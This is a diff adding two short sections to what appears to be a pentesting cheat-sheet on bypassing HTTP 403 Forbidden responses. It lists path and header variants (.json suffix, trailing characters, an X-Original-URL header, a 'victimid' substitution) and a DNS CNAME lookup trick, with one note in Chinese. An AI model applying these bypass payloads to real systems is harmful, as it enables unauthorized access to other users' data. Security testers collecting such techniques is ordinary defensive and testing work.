@@ -86,6 +86,34 @@ python3 forbiddenpass.py -t https://site --path login
 ```
 
 
+## 403 Bypass tricks
+https://twitter.com/mamunwhh/status/1496786769316294659
+```
+Bypass 403 on /api/v1/user/id
+
+/api/v1/user/id.json
+/api/v1/user/id?
+/api/v1/user/id/
+/api/v2/user/id
+/api/v1/user/id&accountdetail
+/api/v1/user/yourid&victimid
+X-Original-URL: /api/v1/user/id/
+
+
+```
+
+
+## A trick
+https://systemweakness.com/how-i-bypassed-403-forbidden-domain-using-a-simple-trick-c2d538de04b8
+
+```
+dig redacted.com
+
+```
+![img_1.png](img_1.png)
+
+要点: 从 `$dig target.com `知道 CNAME 后.....如何获得 200 ....🤔🤔 ====>在浏览器中点击 cname
+
 
 
 
